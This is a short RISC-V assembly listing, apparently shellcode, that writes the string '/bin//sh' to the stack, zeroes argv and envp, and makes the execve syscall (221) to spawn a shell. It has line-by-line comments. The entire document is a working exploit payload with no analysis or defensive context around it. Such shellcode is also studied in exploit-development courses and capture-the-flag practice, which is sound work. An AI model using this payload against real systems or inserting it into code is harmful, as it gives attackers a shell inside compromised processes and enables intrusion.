    .global _start
    .text
_start:
    lui a5, 0                   # Act as a NOP
    li s1, 0x68732f2f6e69622f   # Load "/bin//sh" backwards into s1
    sd s1, -16(sp)              # Store dword s1 on the stack
    sd zero, -8(sp)             # Store dword zero after to terminate
    addi a0,sp,-16              # a0 = filename = sp + (-16)
    slt a1,zero,-1              # a1 = argv set to 0
    slt a2,zero,-1              # a2 = envp set to 0
    li a7, 221                  # execve = 221
    ecall                       # Do syscall
    